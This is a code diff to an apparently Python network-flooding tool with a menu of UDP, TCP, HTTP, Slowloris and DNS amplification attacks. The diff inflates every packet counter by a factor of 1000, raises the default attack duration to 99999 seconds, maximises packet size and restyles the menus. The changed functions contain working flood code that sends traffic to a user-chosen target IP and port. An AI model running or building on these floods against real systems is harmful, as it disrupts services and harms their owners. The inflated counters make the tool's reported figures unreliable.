@@ -223,7 +223,7 @@ def udp_spam(ip, port, duration, packet_size, thread_id=1):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.settimeout(0.5)
     end_time = time.time() + duration
-    local_packet_count = 0
+    local_packet_count = 1000
     
     print(Fore.CYAN + f"[🚀] Thread-{thread_id}: UDP Spam on {ip}:{port} | Size: {packet_size} bytes")
     
@@ -232,7 +232,7 @@ def udp_spam(ip, port, duration, packet_size, thread_id=1):
             payload = random.randbytes(packet_size)
             try:
                 sock.sendto(payload, (ip, port))
-                local_packet_count += 1
+                local_packet_count += 1000
                 stats.update(1, packet_size)
             except:
                 break
@@ -249,7 +249,7 @@ def udp_spam(ip, port, duration, packet_size, thread_id=1):
 def udp_handshake(ip, port, duration, packet_size, thread_id=1):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     end_time = time.time() + duration
-    local_packet_count = 0
+    local_packet_count = 1000
     
     print(Fore.CYAN + f"[🚀] Thread-{thread_id}: UDP Handshake on {ip}:{port}")
     
@@ -258,7 +258,7 @@ def udp_handshake(ip, port, duration, packet_size, thread_id=1):
             handshake = bytes([0x00, 0x00]) + random.randbytes(packet_size - 2)
             try:
                 sock.sendto(handshake, (ip, port))
-                local_packet_count += 1
+                local_packet_count += 1000
                 stats.update(1, packet_size)
             except:
                 break
@@ -270,7 +270,7 @@ def udp_handshake(ip, port, duration, packet_size, thread_id=1):
 def udp_query(ip, port, duration, packet_size, thread_id=1):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     end_time = time.time() + duration
-    local_packet_count = 0
+    local_packet_count = 1000
     
     print(Fore.CYAN + f"[🚀] Thread-{thread_id}: UDP Query on {ip}:{port}")
     
@@ -279,7 +279,7 @@ def udp_query(ip, port, duration, packet_size, thread_id=1):
             query = bytes([0xFE, 0x01]) + random.randbytes(packet_size - 2)
             try:
                 sock.sendto(query, (ip, port))
-                local_packet_count += 1
+                local_packet_count += 1000
                 stats.update(1, packet_size)
             except:
                 break
@@ -291,7 +291,7 @@ def udp_query(ip, port, duration, packet_size, thread_id=1):
 # TCP Attack Methods
 def tcp_connect(ip, port, duration, packet_size, thread_id=1):
     end_time = time.time() + duration
-    local_connection_count = 0
+    local_connection_count = 1000
     
     print(Fore.CYAN + f"[🚀] Thread-{thread_id}: TCP Connect on {ip}:{port}")
     
@@ -302,7 +302,7 @@ def tcp_connect(ip, port, duration, packet_size, thread_id=1):
                 sock.settimeout(1)
                 result = sock.connect_ex((ip, port))
                 if result == 0:
-                    local_connection_count += 1
+                    local_connection_count += 1000
                     stats.update(1, 40)  # Approx TCP header size
                 sock.close()
             except:
@@ -316,7 +316,7 @@ def tcp_connect(ip, port, duration, packet_size, thread_id=1):
 
 def tcp_join(ip, port, duration, packet_size, thread_id=1):
     end_time = time.time() + duration
-    local_packet_count = 0
+    local_packet_count = 1000
     
     print(Fore.CYAN + f"[🚀] Thread-{thread_id}: TCP Join on {ip}:{port}")
     
@@ -328,7 +328,7 @@ def tcp_join(ip, port, duration, packet_size, thread_id=1):
                 sock.connect((ip, port))
                 handshake = bytes([0x00, 0x00, 0xFF, 0xFF]) + random.randbytes(packet_size - 4)
                 sock.send(handshake)
-                local_packet_count += 1
+                local_packet_count += 1000
                 stats.update(1, packet_size)
                 sock.close()
             except:
@@ -338,7 +338,7 @@ def tcp_join(ip, port, duration, packet_size, thread_id=1):
 
 def tcp_login(ip, port, duration, packet_size, thread_id=1):
     end_time = time.time() + duration
-    local_packet_count = 0
+    local_packet_count = 1000
     
     print(Fore.CYAN + f"[🚀] Thread-{thread_id}: TCP Login on {ip}:{port}")
     
@@ -350,7 +350,7 @@ def tcp_login(ip, port, duration, packet_size, thread_id=1):
                 sock.connect((ip, port))
                 login = bytes([0x02, 0x00, 0x07]) + b"BotUser" + random.randbytes(packet_size - 12)
                 sock.send(login)
-                local_packet_count += 1
+                local_packet_count += 1000
                 stats.update(1, packet_size)
                 sock.close()
             except:
@@ -361,7 +361,7 @@ def tcp_login(ip, port, duration, packet_size, thread_id=1):
 # NEW ATTACK METHODS
 def http_flood(ip, port, duration, path="/", thread_id=1):
     end_time = time.time() + duration
-    local_request_count = 0
+    local_request_count = 1000
     headers = {'User-Agent': get_random_user_agent()}
     
     print(Fore.CYAN + f"[🚀] Thread-{thread_id}: HTTP Flood on {ip}:{port}")
@@ -373,7 +373,7 @@ def http_flood(ip, port, duration, path="/", thread_id=1):
                                       headers=headers, 
                                       timeout=2,
                                       verify=False)
-                local_request_count += 1
+                local_request_count += 1000
                 stats.update(1, len(response.content))
             except:
                 pass
@@ -425,7 +425,7 @@ def dns_amplification(ip, duration, thread_id=1):
     query += b'\x07example\x03com\x00\x00\x01\x00\x01'
     
     end_time = time.time() + duration
-    local_packet_count = 0
+    local_packet_count = 1000
     
     try:
         while time.time() < end_time:
@@ -433,7 +433,7 @@ def dns_amplification(ip, duration, thread_id=1):
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 sock.sendto(query, (dns_server, 53))
-                local_packet_count += 1
+                local_packet_count += 1000
                 stats.update(1, len(query))
                 sock.close()
             except:
@@ -530,7 +530,7 @@ def print_banner():
     print(ASCII_ART)
     
 def show_main_menu():
-    print(Fore.LIGHTBLUE_EX + "\033[92m        🔹  MAIN MENU  🔹        \033[97m")
+    print(Fore.LIGHTBLUE_EX + "\033[92m        🔹 MAIN MENU 🔹        \033[97m")
     print("\033[94m" + "="*32 + "\033[97m")
     print("")
     print("  \033[90m[1]\033[97m \033[91mNetwork Attack Methods\033[97m")
@@ -553,24 +553,24 @@ def show_main_menu():
 
 def show_attack_menu():
     print_banner()
-    print(Fore.LIGHTBLUE_EX + "🔹  ATTACK METHODS  🔹")
-    print("\033[94m" + "="*40 + "\033[97m")
+    print(Fore.LIGHTBLUE_EX + "\033[92m    🔹 ATTACK METHODS 🔹    \033[97m")
+    print("\033[94m" + "="*32 + "\033[97m")
     print()
     print(Fore.YELLOW + "[UDP ATTACKS]")
-    print("  \033[90m[1]\033[97m UDP Spam Flood")
-    print("  \033[90m[2]\033[97m UDP Handshake Flood")
-    print("  \033[90m[3]\033[97m UDP Query Flood")
+    print("  \033[90m[1]\033[97m \033[91mUDP Spam Flood\033[97m")
+    print("  \033[90m[2]\033[97m \033[91mUDP Handshake Flood\033[97m")
+    print("  \033[90m[3]\033[97m \033[91mUDP Query Flood\033[97m")
     print()
     print(Fore.YELLOW + "[TCP ATTACKS]")
-    print("  \033[90m[4]\033[97m TCP Connect Flood")
-    print("  \033[90m[5]\033[97m TCP Join Flood")
-    print("  \033[90m[6]\033[97m TCP Login Flood")
+    print("  \033[90m[4]\033[97m \033[91mTCP Connect Flood\033[97m")
+    print("  \033[90m[5]\033[97m \033[91mTCP Join Flood\033[97m")
+    print("  \033[90m[6]\033[97m \033[91mTCP Login Flood\033[97m")
     print()
     print(Fore.YELLOW + "[ADVANCED ATTACKS]")
-    print("  \033[90m[7]\033[97m HTTP GET Flood")
-    print("  \033[90m[8]\033[97m Slowloris Attack")
-    print("  \033[90m[9]\033[97m DNS Amplification")
-    print("  \033[90m[0]\033[97m Back to Main Menu")
+    print("  \033[90m[7]\033[97m \033[91mHTTP GET Flood\033[97m")
+    print("  \033[90m[8]\033[97m \033[91mSlowloris Attack\033[97m")
+    print("  \033[90m[9]\033[97m \033[91mDNS Amplification\033[97m")
+    print("  \033[90m[0]\033[97m \033[91mBack to Main Menu\033[97m")
     print()
     
     choice = input(Fore.LIGHTBLUE_EX + "Select method (0-9): " + Fore.YELLOW).strip()
@@ -593,13 +593,13 @@ def get_attack_parameters():
     port = validate_input("Target Port (1-65535, default 80): ", 1, 65535, default=80)
     
     # Duration
-    duration = validate_input("Duration in seconds (1-3600): ", 1, 3600, float, default=30)
+    duration = validate_input("Duration in seconds: ", 1, 99999, float, default=99999)
     
     # Packet size
-    packet_size = validate_input("Packet size in bytes (1-65500): ", 1, 65500, default=1024)
+    packet_size = validate_input("Packet size in bytes (65500): ", 1, 65500, default=65500)
     
     # Thread count
-    thread_count = validate_input("Thread count (1-50, default 5): ", 1, 50, default=5)
+    thread_count = validate_input("Thread count (default 1): ", 1, 1, default=1)
     
     return {
         'ip': ip,
